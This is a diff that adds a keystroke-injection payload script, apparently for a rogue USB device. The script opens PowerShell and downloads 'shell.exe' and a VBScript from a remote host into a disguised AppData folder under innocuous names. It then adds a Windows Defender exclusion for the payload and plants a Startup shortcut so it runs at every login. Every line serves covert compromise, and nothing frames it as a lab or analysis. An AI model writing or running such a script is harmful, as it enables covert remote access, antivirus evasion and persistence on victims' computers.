@@ -1,0 +1,10 @@
+Press:131+114
+Print:powershell
+Press:128+129+176
+Press:216+176
+PrintLine:(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/shell.exe", "$env:APPDATA\..\Local\Microsoft\Windows\0\wincore.exe")
+PrintLine:(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/invis.vbs", "$env:APPDATA\..\Local\Microsoft\Windows\0\start.vbs")
+PrintLine:Add-MpPreference -ExclusionProcess "wincore.exe"
+PrintLine:$s = (New-Object -comObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wincore.lnk"); $s.TargetPath="C:\Windows\System32\wscript.exe";$s.Arguments="\`"$env:APPDATA\..\Local\Microsoft\Windows\0\start.vbs\`" \`"C:\Users\admin\AppData\Local\Microsoft\Windows\0\wincore.exe\`""; $s.Save();
+
+
